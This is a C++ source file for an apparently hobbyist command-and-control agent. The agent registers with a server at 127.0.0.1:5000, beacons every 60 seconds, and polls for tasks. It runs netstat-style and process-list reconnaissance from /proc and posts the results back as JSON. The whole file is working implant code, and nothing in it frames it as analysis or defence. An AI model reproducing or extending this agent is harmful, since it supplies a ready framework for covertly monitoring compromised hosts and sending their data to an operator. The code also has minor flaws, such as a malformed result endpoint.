#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <fstream>
#include <sstream>
#include <vector>
#include <dirent.h>
#include <nlohmann/json.hpp>

#include <chrono>
#include <thread>

using namespace std;

int BEACON_FREQUENCY = 60;



/*
NETSAT FUNCTIONS
*/

struct Connection {
    string local_address;
    string remote_address;
    string state;
};

string parseAddress(const string& addr) {
    stringstream ss;
    unsigned int ip[4], port;

    sscanf(addr.c_str(), "%02X%02X%02X%02X:%04X", &ip[3], &ip[2], &ip[1], &ip[0], &port);
    ss << ip[0] << "." << ip[1] << "." << ip[2] << "." << ip[3] << ":" << port;

    return ss.str();
}


string getState(const string& hexState) {
    int state;
    stringstream ss;
    ss << hex << hexState;
    ss >> state;

    switch (state) {
        case 1: return "ESTABLISHED";
        case 2: return "SYN_SENT";
        case 3: return "SYN_RECV";
        case 4: return "FIN_WAIT1";
        case 5: return "FIN_WAIT2";
        case 6: return "TIME_WAIT";
        case 7: return "CLOSE";
        case 8: return "CLOSE_WAIT";
        case 9: return "LAST_ACK";
        case 10: return "LISTEN";
        case 11: return "CLOSING";
        default: return "UNKNOWN";
    }
}

vector<Connection> getTCPConnections() {
    vector<Connection> connections;
    ifstream file("/proc/net/tcp");
    string line;

    // Skip the header line
    getline(file, line);

    while (getline(file, line)) {
        stringstream ss(line);
        string tmp, local_address, remote_address, state;

        ss >> tmp; // Skip the sl field
        ss >> local_address;
        ss >> remote_address;
        ss >> state;

        Connection conn;
        conn.local_address = parseAddress(local_address);
        conn.remote_address = parseAddress(remote_address);
        conn.state = getState(state);

        connections.push_back(conn);
    }

    return connections;
}

nlohmann::json netstat_list(int task_id, int agent_id) {
    // JSON building
    nlohmann::json task_json;
    task_json["task_id"] = task_id;
    task_json["agent_id"] = agent_id;
    task_json["command"] = "netstat";

    vector<Connection> connections = getTCPConnections();
    nlohmann::json results = nlohmann::json::array();

    for (const auto& conn : connections) {
        nlohmann::json connection = {
            {"Local", conn.local_address},
            {"Remote", conn.remote_address},
            {"State", conn.state}
        };
        results.push_back(connection);
    }
    task_json["results"] = results;

    return task_json;
}





/*
END NETSAT FUNCTIONS
*/




/*
PROCESS LIST FUNCTIONS
*/

vector<int> get_pids(){
    vector<int> pids;
    DIR* dir = opendir("/proc");
    struct dirent* entry;

    if(dir == nullptr){
        cerr << "Error opening /proc directory." << endl;
        return pids;
    }

    while((entry = readdir(dir)) != nullptr){
        if(entry->d_type == DT_DIR){
            int pid = atoi(entry->d_name);
            if(pid > 0){
                pids.push_back(pid);
            }
        }
    }

    closedir(dir);
    return pids;
}

string get_process_name(int pid){
    ifstream status_file("/proc/" +to_string(pid) + "/status");
    string line;

    while(getline(status_file, line)){
        if(line.find("Name:") == 0){
            return line.substr(6);
        }
    }
    return "";
}


nlohmann::json ps_list(int task_id, int agent_id){
    //json building
    nlohmann::json task_json;
    task_json["task_id"] = task_id;
    task_json["agent_id"] = agent_id;
    task_json["command"] = "process_list";

    std::vector<int> pids = get_pids();
    nlohmann::json results = nlohmann::json::array();

    for(int pid: pids){
        string process_name = get_process_name(pid);
        nlohmann::json proecss = {
            {"PID", pid},
            {"Name", process_name}
        };
        results.push_back(proecss);
    }
    task_json["results"] = results;
    //cout << task_json.dump(4) << endl;
    return task_json;
}


/*
END PROCESS LIST FUNCTIONS
*/

/*
NETWORKING FUNCTIONS

*/

int create_socket() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        cerr << "Error creating socket" << endl;
        exit(1);
    }
    return sock;
}

sockaddr_in setup_server_address(const char* server_host, int server_port) {
    sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    inet_pton(AF_INET, server_host, &server_address.sin_addr);
    server_address.sin_port = htons(server_port);
    return server_address;
}

void connect_to_server(int sock, sockaddr_in& server_address) {
    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        cerr << "Error connecting to server" << endl;
        exit(1);
    }
}

void send_request(int sock, const char* request) {
    if (send(sock, request, strlen(request), 0) < 0) {
        cerr << "Error sending request" << endl;
        exit(1);
    }
}

string receive_response(int sock) {
    char buffer[4096];
    ssize_t bytes_received;
    string response_data;
    while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';  // null-terminate
        response_data += buffer;
    }
    return response_data;
}

void send_post_request(int sock, const std::string& endpoint, const std::string& body) {
    std::string request = "POST " + endpoint + " HTTP/1.1\r\n";
    request += "Host: 127.0.0.1\r\n";
    request += "Content-Type: application/json\r\n";
    request += "Content-Length: " + std::to_string(body.length()) + "\r\n";
    request += "\r\n";  // Headers end
    request += body;    // Request body

    if (send(sock, request.c_str(), request.length(), 0) < 0) {
        cerr << "Error sending POST request" << endl;
        exit(1);
    }
}

string doPost(string body, sockaddr_in server_address){
    int sock = create_socket();
    connect_to_server(sock, server_address);
    string endpoint = "api/agent/task/send_result";
    send_post_request(sock, endpoint, body);
    string response = receive_response(sock);
    close(sock);
    cout << "Sent paylod" << endl;
    return response;
}

int newAgent(sockaddr_in server_address, string ip, string mac){
    nlohmann::json newAgentData;
    newAgentData["ip"] = ip;
    newAgentData["mac"] = mac;

    string body = newAgentData.dump();  
    
    int sock = create_socket();
    connect_to_server(sock, server_address);
    string endpoint = "/api/new_agent";
    send_post_request(sock, endpoint, body);
    string response = receive_response(sock);
    close(sock);
    

    size_t json_start_pos = response.find("{");
    if (json_start_pos != std::string::npos) {
        std::string json_content = response.substr(json_start_pos);
        try {
            nlohmann::json jsonResponse = nlohmann::json::parse(json_content);
            int agentID = jsonResponse["id"];
            return agentID;
        } catch (const std::exception& e) {
            std::cerr << "Error parsing JSON: " << e.what() << std::endl;
            return -1;
        }
    } else {
        std::cerr << "Could not find the start of the JSON content." << std::endl;
        return -1;
    }
}

string pollServer(sockaddr_in server_address, int agentID){
    int sock = create_socket();
    connect_to_server(sock, server_address);

    std::string requestStr = "GET /api/agent/tasks/pending/" + std::to_string(agentID) + " HTTP/1.1\r\nHOST: localhost\r\nConnection: close\r\n\r\n";
    const char* request = requestStr.c_str();
    send_request(sock, request);

    string response_data = receive_response(sock);
    //cout << "Received Data: \n" << response_data << endl;
    close(sock);
    return response_data;
}

void beacon(sockaddr_in server_address, int agentID){
    nlohmann::json beaconData;
    beaconData["agent_id"] = agentID;

    string body = beaconData.dump();  
    
    int sock = create_socket();
    connect_to_server(sock, server_address);
    string endpoint = "/api/beacon";
    send_post_request(sock, endpoint, body);
    string response = receive_response(sock);
    close(sock);
}

/*
END NETWORKING FUNCTIONS

*/



void parse_tasks(const string& response_data, sockaddr_in server_address) {
    size_t json_start_pos = response_data.find("{");
    if (json_start_pos != std::string::npos) {
        std::string json_content = response_data.substr(json_start_pos);

        try {
            nlohmann::json j = nlohmann::json::parse(json_content);

            // Access data (assuming the JSON structure is known)
            auto tasks = j["Tasks"];
            for (const auto& task : tasks) {
                int task_id = task[0];
                int agent_id = task[1];
                string command = task[2];
                string timestamp = task[3];

                
                //cout << "Task ID: " << task_id << ", Agent ID: " << agent_id 
                 //    << ", Task Name: " << command << ", Timestamp: " << timestamp << endl;


                if(command == "netstat"){
                    nlohmann::json netstatJson = netstat_list(task_id, agent_id);
                    string response = doPost(netstatJson.dump(), server_address);
                }
                else if(command == "process_list"){
                    nlohmann::json psJson = ps_list(task_id, agent_id);
                    string response = doPost(psJson.dump(), server_address);
                }
                else {
                    cout << "No method for this task." <<endl;
                }
            }

        } catch (const std::exception& e) {
            std::cerr << "Error parsing JSON: " << e.what() << std::endl;
        }
    } else {
        std::cerr << "Could not find the start of the JSON content." << std::endl;
    }
}



int main() {

    //Server Connection stuff
    const char* server_host = "127.0.0.1";
    const int server_port = 5000;
    sockaddr_in server_address = setup_server_address(server_host, server_port);
    int agentID = newAgent(server_address, "127.0.0.1", "00:00:00:00:00:00");

    agentID = 2; //override for testing
  
    
    while(true) {

        //beacon
        beacon(server_address, agentID);
        //get tasks from server
        string response_data = pollServer(server_address, agentID);
        //parse tasks Json and send POST responses
        parse_tasks(response_data, server_address);

        this_thread::sleep_for(std::chrono::seconds(BEACON_FREQUENCY));
    }    
    



    return 0;
}